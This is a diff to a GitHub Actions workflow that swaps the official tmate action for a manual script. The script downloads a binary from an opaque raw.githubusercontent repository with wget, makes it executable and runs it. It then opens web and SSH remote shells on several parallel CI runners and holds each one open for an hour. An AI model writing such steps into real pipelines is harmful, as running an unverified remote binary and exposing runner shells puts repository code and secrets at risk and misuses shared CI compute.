@@ -1,6 +1,6 @@
 # .github/workflows/tmate-runner.yml
 
-name: Tmate Parallel Runner (Recommended)
+name: Tmate Parallel Runner (Manual Script)
 
 on:
   workflow_dispatch:
@@ -18,7 +18,29 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v4
 
-      - name: Setup tmate session (Job ${{ matrix.job_id }})
-        # This official action handles downloading, running, and waiting.
-        # It will keep the job running until the timeout is reached or you disconnect.
-        uses: tmate-io/tmate-action@v1
+      - name: Start Tmate Session (Job ${{ matrix.job_id }})
+        run: |
+          echo "Downloading tmate for job ${{ matrix.job_id }}..."
+          # Download the tmate binary from your source
+          wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate -O ./tmate
+          chmod +x ./tmate
+
+          echo "Starting tmate session in the background..."
+          # Start tmate in a detached session using a socket
+          ./tmate -S /tmp/tmate.sock new-session -d
+
+          # Wait for the connection to be established
+          ./tmate -S /tmp/tmate.sock wait tmate-ready
+
+          echo "--- Tmate Connection Info ---"
+          # Display the connection info
+          echo "Web Shell URL:"
+          ./tmate -S /tmp/tmate.sock display -p '#{tmate_web}'
+          echo "SSH Connection:"
+          ./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'
+          echo "-----------------------------"
+
+          # Keep the runner alive for the duration of the timeout.
+          # The workflow will be cancelled after 60 minutes by `timeout-minutes`.
+          echo "Session is live. This job will remain active for up to 1 hour."
+          sleep 3600
